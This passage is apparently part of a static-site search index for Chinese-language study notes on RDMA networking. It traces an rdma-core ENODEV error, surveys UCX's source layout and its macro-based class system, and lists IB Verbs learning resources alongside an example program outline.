\u51fd\u6570\u4e86\u3002</p>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/rdma-core/#libmad","title":"libmad","text":""},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/rdma-core/#mad","title":"MAD","text":""},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/rdma-core/#librdmacm","title":"librdmacm","text":""},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/rdma-core/#\u5730\u5740\u7ed1\u5b9a","title":"\u5730\u5740\u7ed1\u5b9a","text":"<p>\u5047\u8bbe\u4f60\u8c03\u7528 <code>rdma_bind_addr()</code> \u65f6\u9047\u5230\u4e86 ENODEV\uff08No such device (19)\uff09\u7684\u95ee\u9898\uff0c\u63a5\u4e0b\u6765\u4e00\u6b65\u6b65\u5206\u6790\u95ee\u9898\u51fa\u73b0\u7684\u4f4d\u7f6e\u3002</p> <p><code>rdma_bind_addr()</code> \u6839\u636e <code>af_ib_support</code> \u5206\u652f\u4e3a\u4e24\u4e2a\u8def\u5f84\uff0c\u51fa\u95ee\u9898\u7684\u8def\u5f84\u5728 IB \u4e0a\uff1a</p> <pre><code>rdma_bind_addr() \u2192 rdma_bind_addr2() \u2192 ucma_query_addr() \u2192 ucma_get_device()\n</code></pre> <pre><code>static int ucma_get_device(struct cma_id_private *id_priv, __be64 guid,\n               uint32_t idx)\n{\n    struct cma_device *cma_dev;\n    int ret;\n\n    pthread_mutex_lock(&amp;mut);\n    cma_dev = ucma_get_cma_device(guid, idx);\n    if (!cma_dev) {\n        pthread_mutex_unlock(&amp;mut);\n        return ERR(ENODEV);  // \u8fd9\u91cc\u8fd4\u56de ENODEV\n    }\n    // ...\n}\n</code></pre> <p>\u5176\u4e2d <code>ucma_get_cma_device()</code> \u8fd4\u56de\u7a7a\u6709\u4e24\u79cd\u60c5\u51b5\uff1a</p> <pre><code>static struct cma_device *ucma_get_cma_device(__be64 guid, uint32_t idx)\n{\n    struct cma_device *cma_dev;\n\n    // \u7b2c\u4e00\u6b21\u67e5\u627e\uff1a\u5728\u73b0\u6709\u8bbe\u5907\u5217\u8868\u4e2d\u67e5\u627e\n    list_for_each(&amp;cma_dev_list, cma_dev, entry)\n        if (!cma_dev-&gt;is_device_dead &amp;&amp; match(cma_dev, guid, idx))\n            goto match;\n\n    // \u5982\u679c\u7b2c\u4e00\u6b21\u67e5\u627e\u5931\u8d25\uff0c\u540c\u6b65\u8bbe\u5907\u5217\u8868\n    if (sync_devices_list())\n        return NULL;  // \u540c\u6b65\u5931\u8d25\uff0c\u8fd4\u56de NULL\n\n    // \u7b2c\u4e8c\u6b21\u67e5\u627e\uff1a\u5728\u66f4\u65b0\u540e\u7684\u8bbe\u5907\u5217\u8868\u4e2d\u67e5\u627e\n    list_for_each(&amp;cma_dev_list, cma_dev, entry)\n        if (!cma_dev-&gt;is_device_dead &amp;&amp; match(cma_dev, guid, idx))\n            goto match;\n\n    cma_dev = NULL;  // \u4e24\u6b21\u67e5\u627e\u90fd\u5931\u8d25\uff0c\u8bbe\u7f6e\u4e3a NULL\n\nmatch:\n    if (cma_dev)\n        cma_dev-&gt;refcnt++;\n    return cma_dev;\n}\n</code></pre> <ul> <li> <p><code>sync_devices_list()</code> \u51fd\u6570\u53ef\u80fd\u5931\u8d25\u7684\u539f\u56e0\uff1a</p> <pre><code>static int sync_devices_list(void)\n{\n    struct ibv_device **new_list;\n    int i, j, numb_dev;\n\n    new_list = ibv_get_device_list(&amp;numb_dev);\n    if (!new_list)\n        return ERR(ENODEV);  // \u83b7\u53d6\u8bbe\u5907\u5217\u8868\u5931\u8d25\n\n    if (!numb_dev) {\n        ibv_free_device_list(new_list);\n        return ERR(ENODEV);  // \u7cfb\u7edf\u4e2d\u6ca1\u6709 RDMA \u8bbe\u5907\n    }\n    // ...\n}\n</code></pre> </li> <li> <p><code>match()</code> \u51fd\u6570\u627e\u4e0d\u5230\u5339\u914d\u7684\u8bbe\u5907\uff1a</p> <pre><code>static bool match(struct cma_device *cma_dev, __be64 guid, uint32_t idx)\n{\n    if ((idx == UCMA_INVALID_IB_INDEX) ||\n        (cma_dev-&gt;ibv_idx == UCMA_INVALID_IB_INDEX))\n        return cma_dev-&gt;guid == guid;\n\n    return cma_dev-&gt;ibv_idx == idx &amp;&amp; cma_dev-&gt;guid == guid;\n}\n</code></pre> <p>\u5339\u914d\u5931\u8d25\u7684\u539f\u56e0\uff1a</p> <ul> <li>\u8bf7\u6c42\u7684 guid \u4e0e\u7cfb\u7edf\u4e2d\u4efb\u4f55\u8bbe\u5907\u7684 GUID \u90fd\u4e0d\u5339\u914d</li> <li>\u8bf7\u6c42\u7684 idx \u4e0e\u7cfb\u7edf\u4e2d\u4efb\u4f55\u8bbe\u5907\u7684\u7d22\u5f15\u90fd\u4e0d\u5339\u914d</li> <li>GUID \u548c\u7d22\u5f15\u90fd\u4e0d\u5339\u914d</li> </ul> </li> </ul> <p>\u82e5\u8981\u4e86\u89e3\u5177\u4f53\u662f\u54ea\u4e2a\u5730\u65b9\u51fa\u9519\uff0c\u53ef\u4ee5\uff1a</p> <ul> <li>\u91cd\u65b0\u7f16\u8bd1 rdma-core \u542f\u7528\u8c03\u8bd5\u4fe1\u606f\uff0c\u4f7f\u7528 GDB \u8c03\u8bd5</li> <li>\u6a21\u4eff\u4e0a\u9762\u7684\u4ee3\u7801\u5199\u4e2a\u4f8b\u7a0b\uff0c\u628a\u4fe1\u606f\u6253\u51fa\u6765\u770b\u770b</li> </ul> <p>\u6682\u65f6\u505c\u6b62\u5728\u8fd9\u91cc\uff0c\u4ee5\u540e\u6709\u7a7a\u518d\u63a2\u7a76\u3002</p>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/rdma-core/#uverbs-\u5c42driversinfinibandcore","title":"uverbs \u5c42\uff1adrivers/infiniband/core","text":""},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/rdma-core/#\u786c\u4ef6\u9a71\u52a8\u5c42driversinfinibandhw","title":"\u786c\u4ef6\u9a71\u52a8\u5c42\uff1adrivers/infiniband/hw","text":""},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/ucx/","title":"UCX","text":""},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/ucx/#ucx","title":"UCX","text":""},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/ucx/#\u57fa\u7840\u77e5\u8bc6","title":"\u57fa\u7840\u77e5\u8bc6","text":""},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/ucx/#\u6574\u4f53\u7ed3\u6784","title":"\u6574\u4f53\u7ed3\u6784","text":"<p>UCX \u6587\u6863\u9996\u9875\u6709\u8fd9\u6837\u7684\u4e00\u5e45\u56fe\uff1a</p> <p></p> <p>\u7136\u800c\u5bf9\u5e94\u5230\u5177\u4f53\uff0c\u7279\u522b\u662f\u9605\u8bfb\u6e90\u7801\u65f6\uff0c\u8fd8\u5c06\u9047\u5230\u51e0\u4e2a\u62bd\u8c61\u5c42\u6b21\u3002\u8fd9\u91cc\u6311\u51fa\u4e00\u4e9b\u6765\u8bb2\u8bb2\uff1a</p> <pre><code>src\n|-- tools\n|   |-- perf\n|   |-- profile\n|   `-- vfs\uff1a\u5b9e\u73b0\u4e86\u7c7b\u4f3c kobject \u548c sysfs \u5bf9\u5e94\u7684 vfs \u63a5\u53e3\uff0c\u7528\u4e8e\u8c03\u8bd5\u548c\u7ba1\u7406\n|-- ucg\uff1a\u96c6\u5408\u901a\u4fe1\n|   |-- api\n|   |-- base\n|-- ucm\uff1a\u8d1f\u8d23\u5185\u5b58\u7ba1\u7406\n|   |-- api\n|   |-- bistro\n|   |-- cuda\n|   |-- event\n|   |-- malloc\n|   |-- mmap\n|   |-- ptmalloc286\n|   |-- rocm\n|   |-- util\n|   `-- ze\n|-- ucp\uff1a\u5904\u7406\u4e0a\u5c42\u534f\u8bae\u62bd\u8c61\uff0c\u5982\u6d88\u606f\u5339\u914d\u3001RPC\u3001\u5efa\u94fe\u7b49\n|   |-- am\n|   |-- api\n|   |-- core\n|   |-- dt\n|   |-- proto\n|   |-- rma\n|   |-- rndv\n|   |-- stream\n|   |-- tag\n|   `-- wireup\n|-- ucs\uff1aUCX \u5185\u90e8\u63d0\u4f9b\u7684\u670d\u52a1\uff08service\uff09\uff0c\u5305\u62ec\u6570\u636e\u7ed3\u6784\u3001\u7b97\u6cd5\u7b49\n|   |-- algorithm\n|   |-- arch\n|   |-- async\n|   |-- config\n|   |-- datastruct\n|   |-- debug\n|   |-- memory\n|   |-- profile\n|   |-- signal\n|   |-- stats\n|   |-- sys\n|   |-- time\n|   |-- type\n|   `-- vfs\n`-- uct\uff1a\u4f20\u8f93\u5c42\uff0c\u8c03\u7528\u5e95\u5c42\u7684\u539f\u8bed\uff0c\u5982 IB Verbs\n    |-- api\n    |-- base\n    |-- cuda\n    |-- ib\n    |-- rocm\n    |-- sm\n    |-- tcp\n    |-- ugni\n    `-- ze\n</code></pre> <p>\u6211\u4eec\u5177\u4f53\u770b\u4e00\u4e0b UCT \u6709\u54ea\u4e9b\u53ef\u9009\u7ec4\u4ef6\uff1a</p> <ul> <li>CUDA<ul> <li>CUDA Copy</li> <li>CUDA IPC</li> <li>GDR Copy</li> </ul> </li> <li>InfiniBand<ul> <li>RC<ul> <li>Verbs</li> </ul> </li> <li>MLX5<ul> <li>DC</li> <li>DV</li> <li>GGA</li> <li>RC</li> <li>UD</li> </ul> </li> </ul> </li> <li>TCP</li> </ul>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/ucx/#\u6e90\u7801\u9605\u8bfb","title":"\u6e90\u7801\u9605\u8bfb","text":"<p>UCX \u7248\u672c\u4fe1\u606f\u5b9a\u4e49\u5728 <code>configure.ac</code> \u7684 <code>ucx_ver</code> \u4e2d\u3002</p>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/ucx/#\u8c03\u8bd5","title":"\u8c03\u8bd5","text":"<p>\u73af\u5883\u53d8\u91cf <code>UCX_LOG_LEVEL=trace</code>\uff0c\u89c1 Frequently Asked Questions \u2014 OpenUCX documentation\u3002</p> <p>\u5728 OpenMPI \u4e2d\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528 <code>--mca pml_ucx_verbose 100</code> \u68c0\u67e5 OpenMPI \u5982\u4f55\u8c03\u7528 UCX\u3002</p>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/ucx/#\u7c7b\u578b\u7cfb\u7edf","title":"\u7c7b\u578b\u7cfb\u7edf","text":"<p>UCX \u4f7f\u7528 C \u7f16\u5199\uff0c\u800c\u5728\u5176\u6570\u636e\u7ed3\u6784\u4e2d\u53c8\u5e7f\u6cdb\u4f7f\u7528 OOP \u548c\u6cdb\u578b\u7f16\u7a0b\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u5b8f\u7684\u5927\u91cf\u4f7f\u7528\u3002\u8ba9\u6211\u4eec\u5148\u63a5\u89e6\u76f8\u5173\u7684\u5b8f\uff0c\u5b83\u4eec\u5b9a\u4e49\u5728 <code>src/ucs/type/class.h</code> \u4e2d\uff0c\u8bf7\u4f60\u501f\u52a9 AI \u81ea\u884c\u4e86\u89e3\u5176\u5de5\u4f5c\u539f\u7406\u3002</p> <pre><code>struct ucs_class {\n    const char               *name;\n    size_t                   size;\n    ucs_class_t              *superclass;\n    ucs_class_init_func_t    init;\n    ucs_class_cleanup_func_t cleanup;\n};\n// OOP \u7cfb\u7edf\nUCX_CLASS_DEFINE(_type)\nUCX_CLASS_DECLARE(_type, _super) // \u7ee7\u627f\u5173\u7cfb\nUCX_CLASS_CALL_SUPER_INIT\n// \u5bf9\u8c61\u901a\u7528\u63a5\u53e3 \nUCX_CLASS_INIT\nUCX_CLASS_NEW\nUCX_CLASS_DELETE\n</code></pre> <p>\u4ee5 <code>UCX_CLASS_DECLARE</code> \u4e3a\u4f8b\uff0c\u5c55\u5f00\u5982\u4e0b\uff1a</p> <pre><code>extern ucs_class_t parent_class_class;\nucs_class_t my_class_class = {\n    \"my_class\",\n    sizeof(my_class),\n    &amp;parent_class_class,\n    (ucs_class_init_func_t)(my_class_init),\n    (ucs_class_cleanup_func_t)(my_class_cleanup)\n};\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u8fd9\u4e9b\u5b8f\u4e00\u8d77\u5b9e\u73b0\u4e86\u7c7b\u4f3c C++ \u7684 OOP \u7c7b\u578b\u7cfb\u7edf\uff0c\u5b9e\u73b0\u4e86\u901a\u7528\u6784\u9020\u51fd\u6570\u3001\u6790\u6784\u51fd\u6570\u3002\u7c7b\u578b\u4e4b\u95f4\u7684\u7ee7\u627f\u5173\u7cfb\u5c06 <code>ucx_class_t</code> \u5b9e\u4f8b\u7ec4\u7ec7\u4e3a\u6811\u72b6\u7ed3\u6784\uff0c\u4ece\u800c\u5b9e\u73b0\u4e86\u7ee7\u627f\u548c\u591a\u6001\u7b49\u7279\u6027\u3002</p> <p>Example</p> <p>\u4ee5 RC Verbs \u7c7b\u578b\u7684\u7f51\u7edc\u63a5\u53e3\u4e3a\u4f8b\uff0c\u6211\u4eec\u6765\u5177\u4f53\u770b\u770b\u8be5\u7c7b\u578b\u7cfb\u7edf\u7684\u4f7f\u7528\u3002</p> <p>UCX IB \u6a21\u5757\u7684\u7ee7\u627f\u5173\u7cfb\u5982\u4e0b\uff1a</p> <pre><code>uct_base_iface_t (UCT \u57fa\u7840\u63a5\u53e3)\n    \u2193\nuct_ib_iface_t (IB \u57fa\u7840\u63a5\u53e3 - src/uct/ib/base/)\n    \u2193\nuct_rc_iface_t (RC \u57fa\u7840\u63a5\u53e3 - src/uct/ib/rc/base/)\n    \u2193\nuct_rc_verbs_iface_t (RC Verbs \u5177\u4f53\u5b9e\u73b0 - src/uct/ib/rc/verbs/)\n</code></pre> <p>\u5728\u6bcf\u4e2a\u7c7b\u578b\u7684\u6587\u4ef6\u4e2d\uff0c\u4f60\u90fd\u53ef\u4ee5\u770b\u89c1 <code>UCS_CLASS_INIT_FUNC</code> \u7684\u5177\u4f53\u5b9a\u4e49\uff0c\u5b83\u4eec\u4e00\u7ea7\u4e00\u7ea7\u5730\u5411\u4e0a\u8c03\u7528\u7236\u7c7b\u7684\u6784\u9020\u51fd\u6570\u3002</p> <p>\u8fd9\u4e9b\u7f51\u7edc\u63a5\u53e3\u672c\u8eab\u4f7f\u7528\u4e86\u7c7b\u578b\u7cfb\u7edf\uff0c\u4f46\u76f8\u5173\u64cd\u4f5c\u6ca1\u6709\u501f\u52a9\u901a\u7528\u5b8f\uff0c\u800c\u662f\u663e\u5f0f\u5730\u505a\u5b9a\u4e49\u3002\u4f8b\u5982\uff1a</p> <pre><code>typedef struct uct_rc_iface_ops {\n    uct_ib_iface_ops_t                  super;\n    uct_rc_iface_init_rx_func_t         init_rx;\n    uct_rc_iface_cleanup_rx_func_t      cleanup_rx;\n    // ...\n} uct_rc_iface_ops_t;\nstatic uct_rc_iface_ops_t uct_rc_verbs_iface_ops = {\n    .super = {\n        .super = {\n            .iface_estimate_perf   = uct_rc_iface_estimate_perf,\n            .iface_vfs_refresh     = uct_rc_iface_vfs_refresh,\n            // ...\n        },\n        .create_cq      = uct_ib_verbs_create_cq,\n        .destroy_cq     = uct_ib_verbs_destroy_cq,\n        // ...\n    },\n    .init_rx         = uct_rc_iface_verbs_init_rx,\n    .cleanup_rx      = uct_rc_iface_verbs_cleanup_rx,\n    // ...\n};\n</code></pre> <p>\u53ef\u4ee5\u5c06\u4e0a\u5c42\u7684\u7c7b\u770b\u4f5c\u62bd\u8c61\u57fa\u7c7b\uff0c\u5b83\u4eec\u5b9a\u4e49\u4e3a\u7c7b\u578b\uff08<code>ops_t</code>\uff09\uff0c\u6ca1\u6709\u5b9e\u73b0\u5177\u4f53\u529f\u80fd\uff1b\u5b50\u7c7b\u5b9a\u4e49\u4e3a\u7c7b\u578b\u7684\u5b9e\u4f8b\uff08<code>ops</code>\uff09\uff0c\u5bf9\u6240\u6709\u5b57\u6bb5\u8fdb\u884c\u586b\u5145\u3002</p> <p>\u8fd9\u6837\u7684\u51fd\u6570\u6307\u9488\u8868\u5b9e\u73b0\u4e86\u591a\u6001\u3002</p>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/ucx/#\u7f51\u7edc\u63a5\u53e3","title":"\u7f51\u7edc\u63a5\u53e3","text":"<p>\u672c\u8282\u8ba9\u6211\u4eec\u4ee5 RC Verbs \u63a5\u53e3\u4e3a\u4f8b\uff0c\u901a\u8fc7\u51e0\u4e2a\u95ee\u9898\u5f15\u5bfc\uff0c\u63a2\u7a76 UCX \u662f\u5982\u4f55\u521d\u59cb\u5316\u7f51\u7edc\u63a5\u53e3\u7684\u3002</p>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/ucx/#iface_t-\u6bcf\u4e00\u5c42\u505a\u4e86\u54ea\u4e9b\u5de5\u4f5c","title":"<code>iface_t</code> \u6bcf\u4e00\u5c42\u505a\u4e86\u54ea\u4e9b\u5de5\u4f5c\uff1f","text":"<p>\u4ece\u6700\u9876\u5c42\u7684 <code>uct_iface_t</code> \u5f00\u59cb\uff1a</p> <ol> <li> <p><code>uct_iface_t</code> </p> <ul> <li>\u57fa\u7840\u7f51\u7edc\u63a5\u53e3\u521d\u59cb\u5316\uff0c\u9a8c\u8bc1\u5e76\u8bbe\u7f6e\u63a5\u53e3\u7684\u64cd\u4f5c\u51fd\u6570\u8868\uff08<code>ops</code>\uff09\u3002</li> <li>\u786e\u4fdd\u6240\u6709\u5fc5\u8981\u7684\u64cd\u4f5c\u51fd\u6570\uff08\u5982<code>ep_flush</code>\u3001<code>ep_fence</code>\u7b49\uff09\u5747\u5df2\u5b9a\u4e49\u3002</li> <li>\u4e3b\u8981\u529f\u80fd\u662f\u4e3a\u63a5\u53e3\u63d0\u4f9b\u901a\u7528\u7684\u64cd\u4f5c\u51fd\u6570\u6846\u67b6\u3002</li> </ul> </li> <li> <p><code>uct_base_iface_t</code> </p> <ul> <li>\u7ee7\u627f\u81ea<code>uct_iface_t</code>\uff0c\u6269\u5c55\u4e86\u57fa\u7840\u63a5\u53e3\u7684\u529f\u80fd\u3002</li> <li>\u521d\u59cb\u5316\u5185\u5b58\u5206\u914d\u65b9\u6cd5\u3001\u9519\u8bef\u5904\u7406\u673a\u5236\u3001\u5de5\u4f5c\u7ebf\u7a0b\u7b49\u3002</li> <li>\u8bbe\u7f6e\u63a5\u53e3\u7684\u7edf\u8ba1\u4fe1\u606f\u548c\u6027\u80fd\u8ba1\u6570\u5668\u3002</li> <li>\u4e3b\u8981\u529f\u80fd\u662f\u4e3a\u63a5\u53e3\u63d0\u4f9b\u66f4\u9ad8\u7ea7\u7684\u901a\u7528\u529f\u80fd\uff0c\u5982\u5185\u5b58\u7ba1\u7406\u548c\u9519\u8bef\u5904\u7406\u3002</li> </ul> </li> <li> <p><code>uct_ib_iface_t</code> </p> <ul> <li>\u7ee7\u627f\u81ea<code>uct_base_iface_t</code>\uff0c\u4e13\u4e3a InfiniBand \u8bbe\u5907\u8bbe\u8ba1\u3002</li> <li>\u521d\u59cb\u5316 IB \u8bbe\u5907\u7684\u7aef\u53e3\u3001\u961f\u5217\u5bf9\uff08QP\uff09\u3001\u5b8c\u6210\u961f\u5217\uff08CQ\uff09\u7b49\u786c\u4ef6\u8d44\u6e90\u3002</li> <li>\u914d\u7f6e\u8def\u5f84 MTU\u3001\u6d41\u91cf\u63a7\u5236\uff08FC\uff09\u53c2\u6570\u3001\u5168\u5c40\u5730\u5740\u7b49\u3002</li> <li>\u4e3b\u8981\u529f\u80fd\u662f\u4e3a IB \u8bbe\u5907\u63d0\u4f9b\u5e95\u5c42\u786c\u4ef6\u8d44\u6e90\u7684\u521d\u59cb\u5316\u548c\u914d\u7f6e\u3002</li> </ul> </li> <li> <p><code>uct_rc_iface_t</code> </p> <ul> <li>\u7ee7\u627f\u81ea<code>uct_ib_iface_t</code>\uff0c\u4e13\u4e3a\u53ef\u9760\u8fde\u63a5\uff08RC\uff09\u6a21\u5f0f\u8bbe\u8ba1\u3002</li> <li>\u521d\u59cb\u5316 RC \u6a21\u5f0f\u7684\u53d1\u9001\u548c\u63a5\u6536\u961f\u5217\u3001\u539f\u5b50\u64cd\u4f5c\u5904\u7406\u51fd\u6570\u3001\u6d41\u63a7\uff08FC\uff09\u673a\u5236\u7b49\u3002</li> <li>\u914d\u7f6e QP \u7684\u91cd\u8bd5\u6b21\u6570\u3001RNR \u8d85\u65f6\u7b49\u53c2\u6570\u3002</li> <li>\u4e3b\u8981\u529f\u80fd\u662f\u4e3a RC \u6a21\u5f0f\u63d0\u4f9b\u7279\u5b9a\u7684\u53ef\u9760\u6027\u548c\u6d41\u63a7\u652f\u6301\u3002</li> </ul> </li> <li> <p><code>uct_rc_verbs_iface_t</code> </p> <ul> <li>\u7ee7\u627f\u81ea<code>uct_rc_iface_t</code>\uff0c\u4e13\u4e3a Verbs API \u5b9e\u73b0\u3002</li> <li>\u521d\u59cb\u5316 Verbs \u7279\u6709\u7684\u8d44\u6e90\uff0c\u5982\u77ed\u63cf\u8ff0\u7b26\u5185\u5b58\u6c60\u3001\u5185\u8054\u5de5\u4f5c\u8bf7\u6c42\uff08WR\uff09\u7b49\u3002</li> <li>\u914d\u7f6e\u6700\u5927\u5185\u8054\u6570\u636e\u5927\u5c0f\u3001\u53d1\u9001 SGE \u6570\u91cf\u7b49\u786c\u4ef6\u9650\u5236\u3002</li> <li>\u4e3b\u8981\u529f\u80fd\u662f\u4e3a Verbs API \u63d0\u4f9b\u4f18\u5316\u7684\u8d44\u6e90\u7ba1\u7406\u548c\u6027\u80fd\u8c03\u4f18\u3002</li> </ul> </li> </ol>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/ucx/#\u5efa\u94fe\u8fc7\u7a0b","title":"\u5efa\u94fe\u8fc7\u7a0b","text":"<p>OpenUCX FAQ \u4e2d\u6709\u4e00\u884c\u5c0f\u5b57\uff1a</p> <p>Using rc_verbs or rc_mlx5 also requires ud_verbs or ud_mlx5 transport for bootstrap.</p> <p>\u8868\u660e UCX \u540c\u6837\u4e0d\u652f\u6301\u901a\u8fc7 ETH TCP \u5efa\u94fe\u3002</p>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/ucx/#srq-\u662f\u5728\u54ea\u4e00\u5c42\u914d\u7f6e\u7684","title":"SRQ \u662f\u5728\u54ea\u4e00\u5c42\u914d\u7f6e\u7684\uff1f","text":"<p>\u770b\u4e00\u4e0b\u6570\u636e\u7ed3\u6784\uff1a</p> <pre><code>struct uct_ib_iface {\n    uct_base_iface_t          super;\n\n    struct ibv_cq             *cq[UCT_IB_DIR_LAST];\n    struct ibv_comp_channel   *comp_channel;\n    // ...\n}\nstruct uct_rc_iface {\n    uct_ib_iface_t              super;\n\n    struct {\n        /* Credits for completions.\n         * May be negative in case mlx5 because we take \"num_bb\" credits per\n         * post to be able to calculate credits of outstanding ops on failure.\n         * In case of verbs TL we use QWE number, so 1 post always takes 1\n         * credit */\n        signed                  cq_available;\n        ssize_t                 reads_available;\n        ssize_t                 reads_completed;\n        // ...\n    } tx;\n\n    struct {\n        ucs_mpool_t          mp;\n        uct_rc_srq_t         srq;\n    } rx;\n    // ...\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u4ece <code>rc_iface</code> \u8fd9\u4e00\u5c42\u5f00\u59cb\u6709 SRQ\uff0c\u5bb9\u6613\u627e\u5230\u5176\u521d\u59cb\u5316\u51fd\u6570\uff1a<code>uct_rc_iface_init_rx()</code>\uff0c\u8be5\u51fd\u6570\u76f4\u63a5\u8c03\u7528 <code>ibv_create_srq()</code> \u8fdb\u884c\u521b\u5efa\u3002\u4e0a\u5c42\u8c03\u7528\u94fe\u4e3a\uff1a</p> <p></p>"},{"location":"optimization/HPN/%E7%BC%96%E7%A8%8B/dpdk/","title":"DPDK","text":""},{"location":"optimization/HPN/%E7%BC%96%E7%A8%8B/dpdk/#dpdk","title":"DPDK","text":""},{"location":"optimization/HPN/%E7%BC%96%E7%A8%8B/ibverbs/","title":"IB Verbs","text":""},{"location":"optimization/HPN/%E7%BC%96%E7%A8%8B/ibverbs/#ib-verbs","title":"IB Verbs","text":"<p>Quote</p> <ul> <li>\u9605\u8bfb InfiniBand: An Introduction + Simple IB verbs program with RDMA Write - Service Engineering (ICCLab &amp; SPLab)\uff0c\u4e86\u89e3 PD\u3001MR\u3001QP\u3001CQ\u3001WR\u3001SGE\u3001WC \u7b49\u57fa\u672c\u6982\u5ff5\u3002</li> <li>\u9605\u8bfb RDMA Tutorial - Netdev\uff0c\u5176\u4e2d\u4ecb\u7ecd\u4e86 <code>ipv_pd</code> \u7b49\u91cd\u8981\u7684 API\u3002</li> <li>\u9605\u8bfb Introduction to Programming Infiniband RDMA \u00b7 Better Tomorrow with Computer Science\uff0c\u8fd9\u7bc7\u6587\u7ae0\u9010\u6b65\u8bb2\u89e3\u4e86\u5982\u4f55\u7f16\u5199\u4e00\u4e2a\u7b80\u5355\u7684 RDMA \u7a0b\u5e8f\uff0c\u5e76\u7ed9\u51fa\u4e86\u8be6\u7ec6\u7684\u4ee3\u7801\u3002</li> <li>\u9605\u8bfb InfiniBandTM Architecture Specification Volume 1\uff0c\u89c4\u8303\u4e2d\u7684\u7b2c\u5341\u7ae0\u5b9a\u4e49\u4e86\u8f6f\u4ef6\u63a5\u53e3\uff0c\u5373 IB Verbs\u3002</li> <li>Mellanox Adapters Programmer\u2019s Reference Manual\uff1a\u8be5\u624b\u518c\u9002\u7528\u4e8e CX4\uff0c\u8be6\u7ec6\u5730\u63cf\u8ff0\u4e86 IB Verbs \u7f16\u7a0b\u7684\u6240\u6709\u7ec6\u8282\uff0c\u7ec6\u81f4\u5230\u6bcf\u4e2a\u5b57\u6bb5\u7684\u5b9a\u4e49\u3002</li> <li>RDMA Aware Networks Programming User Manual - NVIDIA Docs\uff1a\u5305\u542b RDMA \u67b6\u6784\u6982\u8ff0\u548c IB Verbs\u3001RDMACM \u7684 API \u6587\u6863\u3002\u8be5\u6587\u6863\u7b2c\u516b\u7ae0\u5305\u542b\u4e86\u5404\u5c42\u6b21 API \u7f16\u7a0b\u7684\u4f8b\u5b50\uff0c\u5177\u6709\u6bd4\u8f83\u8be6\u7ec6\u7684\u6ce8\u91ca\uff0c\u9002\u5408\u521d\u5b66\u8005\u5b66\u4e60\u3002\u672c\u6587\u4e2d\u7684\u90e8\u5206\u7f16\u7a0b\u793a\u4f8b\u6765\u81ea\u8be5\u624b\u518c\u3002</li> </ul> <ul> <li>\u5934\u6587\u4ef6\uff1a<code>infiniband/verbs.h</code></li> <li>API \u524d\u7f00\uff1a<code>ibv_</code></li> <li>\u8f6f\u4ef6\u5305\uff1a<code>libibverbs-dev</code></li> </ul>"},{"location":"optimization/HPN/%E7%BC%96%E7%A8%8B/ibverbs/#\u4f8b\u7a0b","title":"\u4f8b\u7a0b","text":"<p>\u4ee3\u7801\u89c1 <code>RDMA_RC_example.c</code>\u3002</p> <p>\u51c6\u5907\u9636\u6bb5\uff1a</p> <ul> <li><code>resource_create()</code>\uff1a\u521b\u5efa\u8d44\u6e90\uff0c\u5305\u62ec PD\u3001MR\u3001QP\u3001CQ \u7b49\u3002</li> <li><code>connect_qp()</code>\uff1a\u901a\u4fe1\u53cc\u65b9\u4ea4\u6362\u4fe1\u606f\uff0c\u5305\u62ec LID\u3001QP_NUM\u3001RKEY \u7b49\uff0c\u5c06 QP \u72b6\u6001\u66f4\u6539\u4e3a INIT\u3001RTR\u3001RTS\u3002<ul> <li><code>sock_sync_data()</code>\uff1a\u901a\u8fc7 TCP \u901a\u4fe1\u4ea4\u6362\u4fe1\u606f\u3002</li> <li><code>modify_qp_to_init()</code></li> <li><code>post_receive()</code>\uff1a\u9884\u7f6e\u63a5\u6536\u961f\u5217\uff0c\u4e5f\u53ef\u4ee5\u653e\u5728\u901a\u4fe1\u9636\u6bb5\u3002</li> <li><code>modify_qp_to_rtr()</code></li> <li><code>modify_qp_to_rts()</code></li> <li>\u540c\u6b65\u70b9</li> </ul> </li> </ul> <pre><code>flowchart TD\n subgraph s1[\"resource_create()\"]\n  n27@{ shape: \"rounded\", label: \"ibv_query_port()\" }\n  n26@{ shape: \"hex\", label: \"ibv_port_attr\" }\n  n25@{ shape: \"hex\", label: \"ibv_mr\" }\n  n17@{ shape: \"hex\", label: \"char *\" }\n  n16@{ shape: \"rounded\", label: \"ibv_get_device_name()\" }\n  n15@{ shape: \"rounded\", label: \"ibv_get_device_list()\" }\n  n14@{ shape: \"hex\", label: \"ibv_device\" }\n n1@{ shape: \"hex\", label: \"ibv_pd\" }\n n2@{ shape: \"rounded\", label: \"ibv_alloc_pd()\" }\n n3@{ shape: \"hex\", label: \"ibv_context\" }\n n4@{ shape: \"hex\", label: \"buf\" }\n n3 --- n2\n n2 --- n1\n n5@{ shape: \"rounded\", label: \"ibv_open_device()\" }\n n5 --- n3\n n6@{ shape: \"rounded\", label: \"ibv_create_cq()\" }\n n3 --- n6\n n7@{ shape: \"hex\", label: \"mr_flags\" }\n n8@{ shape: \"rounded\", label: \"ibv_reg_mr\" }\n n4 --- n8\n 